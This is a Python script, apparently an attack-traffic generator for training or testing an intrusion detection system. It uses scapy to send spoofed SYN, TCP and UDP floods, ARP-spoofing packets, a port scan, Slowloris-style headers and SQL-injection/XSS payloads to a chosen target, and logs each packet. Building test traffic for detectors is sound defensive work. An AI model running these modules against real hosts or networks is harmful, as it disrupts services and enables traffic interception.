import scapy.all as scapy
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether, ARP
import time
import random
import socket
import argparse
import os
import csv
from scapy.all import get_if_addr, conf

class PacketSimulator:
    """
    Simulates real-world network attacks and normal traffic patterns.
    Logs all generated packets cleanly into CSV files in the 'stimulate/' directory.
    """
    def __init__(self, target_ip=None, gw_ip=None):
        self.target_ip = target_ip or self.auto_detect_target()
        self.gw_ip = gw_ip or self.auto_detect_gateway()
        self.log_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "stimulate")
        
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)

        # Database initialization
        try:
            from pymongo import MongoClient
            from dotenv import load_dotenv
            load_dotenv()
            mongo_uri = os.getenv("MONGO_URI", "mongodb://localhost:27017/")
            self.mongo_client = MongoClient(mongo_uri)
            self.db = self.mongo_client["AI-IDS"]
            self.use_mongo = True
            print("💾 Logging enabled: MongoDB (Database: AI-IDS)")
        except ImportError:
            self.use_mongo = False
            print("pymongo not installed, falling back to CSV.")
        except Exception as e:
            self.use_mongo = False
            print(f"⚠️ MongoDB connection failed. Falling back to CSV. Error: {e}")

        print(f"🎯 Target IP: {self.target_ip}")
        print(f"🌉 Gateway IP (for MITM): {self.gw_ip}")
        print(f"📡 Interface: {conf.iface}")
        if self.use_mongo:
            print(f"📂 Logging all attack data to MongoDB 'AI-IDS' collections")
        else:
            print(f"📂 Logging all attack data to: {self.log_dir}/")

    def auto_detect_target(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def auto_detect_gateway(self) -> str:
        try:
            # Simple assumption: Gateway is usually .1 on the subnet
            parts = self.auto_detect_target().split('.')
            return f"{parts[0]}.{parts[1]}.{parts[2]}.1"
        except:
            return "192.168.1.1"

    def _rand_ip(self):
        """Generates a random public source IP Address for DDoS spoofing"""
        return f"{random.randint(1,200)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

    def log_and_send(self, attack_name, packets):
        """Writes the generated packets to MongoDB (or CSV fallback) and sends them."""
        docs = []
        csv_rows = []
        
        for pkt in packets:
            ts = time.time()
            src = pkt[IP].src if IP in pkt else (pkt[ARP].psrc if ARP in pkt else "Unknown")
            dst = pkt[IP].dst if IP in pkt else (pkt[ARP].pdst if ARP in pkt else "Unknown")
            proto = "TCP" if TCP in pkt else ("UDP" if UDP in pkt else ("ICMP" if ICMP in pkt else ("ARP" if ARP in pkt else "Other")))
            port = pkt[TCP].dport if TCP in pkt else (pkt[UDP].dport if UDP in pkt else "")
            flags = str(pkt[TCP].flags) if TCP in pkt else ""
            length = len(pkt)
            
            payload = ""
            if scapy.Raw in pkt:
                try:
                    payload = pkt[scapy.Raw].load.decode('utf-8', errors='ignore')[:30].replace('\n', ' ')
                except:
                    payload = "BINARY_DATA"
                    
            if getattr(self, "use_mongo", False):
                docs.append({
                    "Timestamp": ts,
                    "Src_IP": src,
                    "Dst_IP": dst,
                    "Protocol": proto,
                    "Dst_Port": port,
                    "Flags": flags,
                    "Length": length,
                    "Payload_Snippet": payload
                })
            else:
                csv_rows.append([ts, src, dst, proto, port, flags, length, payload])
                
            # Send the packet into reality
            scapy.send(pkt, verbose=False)
            
        if getattr(self, "use_mongo", False) and docs:
            try:
                self.db[attack_name].insert_many(docs)
            except Exception as e:
                print(f"MongoDB Insert Error: {e}")
        elif csv_rows:
            csv_file = os.path.join(self.log_dir, f"{attack_name}.csv")
            file_exists = os.path.isfile(csv_file)
            with open(csv_file, 'a', newline='') as f:
                writer = csv.writer(f)
                if not file_exists:
                    writer.writerow(["Timestamp", "Src_IP", "Dst_IP", "Protocol", "Dst_Port", "Flags", "Length", "Payload_Snippet"])
                writer.writerows(csv_rows)

    # ---------------------------------------------------------
    #                     ATTACK MODULES
    # ---------------------------------------------------------

    def dos_attack(self, duration=5, pps=50):
        print(f"🔥 Starting DoS (Single-Source) on {self.target_ip}...")
        start = time.time()
        single_src_ip = "114.55.23.100"
        while time.time() - start < duration:
            batch = []
            for _ in range(pps):
                pkt = IP(src=single_src_ip, dst=self.target_ip)/TCP(dport=80, flags="S")
                batch.append(pkt)
            self.log_and_send("dos_traffic", batch)
            time.sleep(1.0)
        print("✅ DoS finished.")

    def ddos_attack(self, duration=5, pps=100):
        print(f"💣 Starting DDoS (Multi-Source/Spoofed) on {self.target_ip}...")
        start = time.time()
        while time.time() - start < duration:
            batch = []
            for _ in range(pps):
                pkt = IP(src=self._rand_ip(), dst=self.target_ip)/TCP(dport=random.choice([80, 443, 8080]), flags="S")
                batch.append(pkt)
            self.log_and_send("ddos_traffic", batch)
            time.sleep(1.0)
        print("✅ DDoS finished.")

    def mitm_attack(self):
        print(f"🕵️ Starting Man-in-the-Middle (ARP Spoofing) simulation...")
        # Simulate telling the gateway that WE are the target, and the target that WE are the gateway
        batch = [
            ARP(op=2, pdst=self.target_ip, psrc=self.gw_ip, hwsrc="00:11:22:33:44:55"),
            ARP(op=2, pdst=self.gw_ip, psrc=self.target_ip, hwsrc="00:11:22:33:44:55")
        ]
        for _ in range(5):
            self.log_and_send("mitm_traffic", batch)
            time.sleep(1.0)
        print("✅ MITM packets sent.")

    def scan_attack(self):
        print(f"🔍 Starting Port Scan on {self.target_ip}...")
        src_ip = "45.33.22.11"
        batch = []
        for port in [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3306, 3389]:
            pkt = IP(src=src_ip, dst=self.target_ip)/TCP(dport=port, flags="S")
            batch.append(pkt)
        self.log_and_send("scan_traffic", batch)
        print("✅ Port scan finished.")

    def normal_traffic(self, duration=10, pps=5):
        print(f"🌐 Simulating Normal IP Traffic (Web Browsing)...")
        start = time.time()
        while time.time() - start < duration:
            batch = []
            for _ in range(pps):
                src_ip = "192.168.1." + str(random.randint(100, 200))
                port = random.choice([80, 443])
                # Simulate valid connections: SYN -> ACK -> PSH/ACK -> FIN
                s_pkt = IP(src=src_ip, dst=self.target_ip)/TCP(dport=port, flags="S")
                a_pkt = IP(src=src_ip, dst=self.target_ip)/TCP(dport=port, flags="A")
                p_pkt = IP(src=src_ip, dst=self.target_ip)/TCP(dport=port, flags="PA")/scapy.Raw(load=b"GET / HTTP/1.1\r\nHost: server\r\n\r\n")
                f_pkt = IP(src=src_ip, dst=self.target_ip)/TCP(dport=port, flags="FA")
                batch.extend([s_pkt, a_pkt, p_pkt, f_pkt])
            self.log_and_send("normal_traffic", batch)
            time.sleep(1.0)
        print("✅ Normal traffic finished.")

    def festival_traffic(self, duration=5, users=100):
        print(f"🎉 Simulating Festival Time Traffic (Massive Valid Connections) on {self.target_ip}...")
        # Very high volume, but composed entirely of perfectly valid PSH/ACK web requests from multiple IPs.
        start = time.time()
        while time.time() - start < duration:
            batch = []
            for _ in range(users):
                src_ip = "10.0.0." + str(random.randint(1, 250))
                # Perfect HTTP requests
                pkt = IP(src=src_ip, dst=self.target_ip)/TCP(dport=443, flags="PA")/scapy.Raw(load=b"GET /buy-tickets HTTP/1.1\r\nHost: example.com\r\n\r\n")
                batch.append(pkt)
            self.log_and_send("festival_traffic", batch)
            time.sleep(1.0)
        print("✅ Festival traffic finished.")

    def slowloris_attack(self, duration=15):
        print(f"🐢 Starting Stretch/Slowloris attack on {self.target_ip}...")
        # Sends incomplete HTTP headers extremely slowly to tie up sockets
        for i in range(duration):
            batch = []
            for j in range(10): # 10 slow connections
                src_ip = f"112.55.33.{j}"
                payload = f"X-Header-{i}: SlowData\r\n"
                pkt = IP(src=src_ip, dst=self.target_ip)/TCP(dport=80, flags="PA")/scapy.Raw(load=payload)
                batch.append(pkt)
            self.log_and_send("stretch_slow_traffic", batch)
            time.sleep(1.0) # Sleep 1 second between pieces of the header
        print("✅ Stretch/Slow attack finished.")

    def waf_injection(self):
        print(f"💉 Starting WAF Injection (SQLi/XSS) on {self.target_ip}...")
        src_ip = "99.88.77.66"
        payloads = [
            "GET /search?id=1' OR 1=1 -- HTTP/1.1",
            "GET /admin?cmd=DROP TABLE users HTTP/1.1",
            "POST /login HTTP/1.1\r\n\r\n<script>alert('XSS')</script>",
            "GET /?test=<script>document.cookie</script> HTTP/1.1"
        ]
        batch = []
        for p in payloads:
            pkt = IP(src=src_ip, dst=self.target_ip)/TCP(dport=80, flags="PA")/scapy.Raw(load=p)
            batch.append(pkt)
        
        for _ in range(3):
            self.log_and_send("waf_injection", batch)
            time.sleep(0.5)
        print("✅ WAF Injection finished.")

    def tcp_volumetric_flood(self, duration=5, pps=100):
        print(f"🔥 Starting TCP Volumetric Flood on {self.target_ip}...")
        start = time.time()
        while time.time() - start < duration:
            batch = []
            for _ in range(pps):
                pkt = IP(src=self._rand_ip(), dst=self.target_ip)/TCP(dport=80, flags="A")
                batch.append(pkt)
            self.log_and_send("tcp_volumetric_flood", batch)
            time.sleep(1.0)
        print("✅ TCP Volumetric Flood finished.")

    def udp_volumetric_flood(self, duration=5, pps=100):
        print(f"🌊 Starting UDP Volumetric Flood on {self.target_ip}...")
        start = time.time()
        while time.time() - start < duration:
            batch = []
            for _ in range(pps):
                pkt = IP(src=self._rand_ip(), dst=self.target_ip)/UDP(dport=random.randint(1024, 65535))/scapy.Raw(load=b"X"*500)
                batch.append(pkt)
            self.log_and_send("udp_volumetric_flood", batch)
            time.sleep(1.0)
        print("✅ UDP Volumetric Flood finished.")

    def half_open_syn_flood(self, count=200):
        print(f"🤝 Starting Half-Open SYN Flood on {self.target_ip}...")
        batch = []
        src_ip = "64.22.11.8"
        for _ in range(count):
            pkt = IP(src=src_ip, dst=self.target_ip)/TCP(dport=80, sport=random.randint(1024, 65535), flags="S")
            batch.append(pkt)
        self.log_and_send("half_open_syn_flood", batch)
        print("✅ Half-Open SYN Flood finished.")

    def mixed_attacks(self):
        print("🌪️ Starting MIXED ATTACKS (Chaos Mode)...")
        # DoS + Scans + WAF all at once
        for _ in range(3):
            self.scan_attack()
            self.dos_attack(duration=1, pps=30)
            self.waf_injection()
            time.sleep(1)
        print("✅ Mixed Attacks finished.")


def main():
    parser = argparse.ArgumentParser(description="IDS Combat Simulator & CSV Generator")
    parser.add_argument("--target", help="Target IP address of the main system", default=None)
    parser.add_argument("--choice", help="Selection (1-13) for the simulation scenario", type=str, default=None)
    parser.add_argument("--gateway", help="Gateway IP address for MITM simulation", default=None)
    args = parser.parse_args()

    if args.target:
        print(f"🎯 Target IP provided via CLI: {args.target}")
        sim = PacketSimulator(target_ip=args.target, gw_ip=args.gateway)
    elif args.choice:
        print("🎯 Auto-detecting Target IP for CLI-triggered attack...")
        sim = PacketSimulator(gw_ip=args.gateway)
    else:
        print("\n" + "="*40)
        print("⚔️  TARGET CONFIGURATION  ⚔️")
        print("="*40)
        print("Enter the IP address of your MAIN SYSTEM running the AI-IDS.")
        print("Example: 192.168.1.10 or 10.195.216.206")
        target_input = input("\nTarget IP [Press Enter to auto-detect]: ").strip()
        if target_input:
            sim = PacketSimulator(target_ip=target_input, gw_ip=args.gateway)
        else:
            sim = PacketSimulator(gw_ip=args.gateway)

    if args.choice:
        choice = args.choice
        print(f"🚀 Running attack choice: {choice} from CLI argument.")
        if choice == '1': sim.ddos_attack()
        elif choice == '2': sim.dos_attack()
        elif choice == '3': sim.mitm_attack()
        elif choice == '4': sim.scan_attack()
        elif choice == '5': sim.normal_traffic()
        elif choice == '6': sim.festival_traffic()
        elif choice == '7': sim.slowloris_attack()
        elif choice == '8': sim.waf_injection()
        elif choice == '9': sim.mixed_attacks()
        elif choice == '10': sim.tcp_volumetric_flood()
        elif choice == '11': sim.udp_volumetric_flood()
        elif choice == '12': sim.half_open_syn_flood()
        elif choice == '13':
            sim.normal_traffic(duration=3)
            sim.scan_attack()
            sim.dos_attack(duration=3)
            sim.festival_traffic(duration=3)
            sim.mitm_attack()
            sim.mixed_attacks()
            print("\n🎉✅ ALL SCENARIOS COMPLETE!")
        else:
            print(f"❌ Invalid choice '{choice}' from CLI.")
        return

    while True:
        print("\n" + "="*40)
        print("⚔️  IDS COMBAT SIMULATOR & CSV GENERATOR  ⚔️")
        print("="*40)
        print("1.  DDoS (Distributed Denial of Service)")
        print("2.  DoS (Single-Source Denial of Service)")
        print("3.  MITM (Man in the Middle - ARP Spoof)")
        print("4.  Port Scan")
        print("5.  Normal IP Traffic (Web Browsing)")
        print("6.  Festival Time Traffic (High Volume Valid)")
        print("7.  Stretch / Slowloris (Slow Http Headers)")
        print("8.  WAF Injection (SQLi / XSS)")
        print("9.  Mixed Attacks (Chaos Mode)")
        print("10. TCP Volumetric Flood")
        print("11. UDP Volumetric Flood")
        print("12. Half-Open SYN Flood")
        print("13. RUN ALL SCENARIOS IN SEQUENCE")
        print("0.  Exit")
        print("="*40)
        
        choice = input("\nSelect traffic scenario to generate & log: ")
        print("")
        
        if choice == '1': sim.ddos_attack()
        elif choice == '2': sim.dos_attack()
        elif choice == '3': sim.mitm_attack()
        elif choice == '4': sim.scan_attack()
        elif choice == '5': sim.normal_traffic()
        elif choice == '6': sim.festival_traffic()
        elif choice == '7': sim.slowloris_attack()
        elif choice == '8': sim.waf_injection()
        elif choice == '9': sim.mixed_attacks()
        elif choice == '10': sim.tcp_volumetric_flood()
        elif choice == '11': sim.udp_volumetric_flood()
        elif choice == '12': sim.half_open_syn_flood()
        elif choice == '13':
            sim.normal_traffic(duration=3)
            sim.scan_attack()
            sim.dos_attack(duration=3)
            sim.festival_traffic(duration=3)
            sim.mitm_attack()
            sim.mixed_attacks()
            print("\n🎉✅ ALL SCENARIOS COMPLETE! Check the stimulate/ folder for your CSV files.")
        elif choice == '0':
            break
        else:
            print("❌ Invalid choice. Enter 0-13.")

if __name__ == "__main__":
    main()
